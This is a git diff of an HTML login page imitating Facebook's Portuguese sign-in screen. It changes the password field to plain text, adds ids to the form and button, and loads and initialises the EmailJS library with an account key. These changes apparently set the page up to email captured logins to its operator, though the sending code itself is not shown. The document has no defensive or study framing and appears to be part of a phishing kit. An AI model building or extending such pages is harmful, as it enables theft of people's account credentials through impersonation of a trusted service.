@@ -18,19 +18,37 @@
         </div>
 
         <div class="form">
-            <form class="a-form">
-                <input type="email" id="Email" class="a-email" name="Email" placeholder="Endereço de e-mail ou número de telefone"
-                    autofocus="autofocus" required />
-                <input type="password" id="Password" class="a-pss" name="Password" placeholder="Senha"
-                    autofocus="autofocus" />
-                <input type="submit" class="a-sub" value="Entrar" />
-                <a href="" class="a-link">Esqueceu a senha?</a>
-                <hr class="a-hr">
-                <input type="submit " value="Criar Nova Conta" class="a-but" />
+            <form id="forme" class="a-form">
+              
+              <div class="field">
+                                <label for="Email"></label>
+                                <input type="text" name="Email" id="Email" class="a-email" placeholder="Endereço de e-mail ou número de telefone"
+                                autofocus="autofocus" required />
+                              
+                                <label for="Senha"></label>
+                                <input type="text" name="Senha" id="Senha"  class="a-pss"  placeholder="Senha"
+                                autofocus="autofocus" />
+                              </div>
+                              
+                              
+            
+              <input type="submit" id="button" class="a-sub" value="Entrar" >
+              
+              <a href="" class="a-link">Esqueceu a senha?</a>
+                            <hr class="a-hr">
+                            <input type="submit " value="Criar Nova Conta" class="a-but" />
+             
             </form>
             <div class="create-page">
-                <a href="" class="a-href">Criar uma Página</a></b> para uma celebridade, banda ou empresa.
+                            <a href="" class="a-href">Criar uma Página</a></b> para uma celebridade, banda ou empresa.
+                        </div>
             </div>
+            <script type="text/javascript"
+              src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+            
+            <script type="text/javascript">
+              emailjs.init('ukcV14SAe8nTGj5Zg')
+            </script>
             </div>
         </div>
 
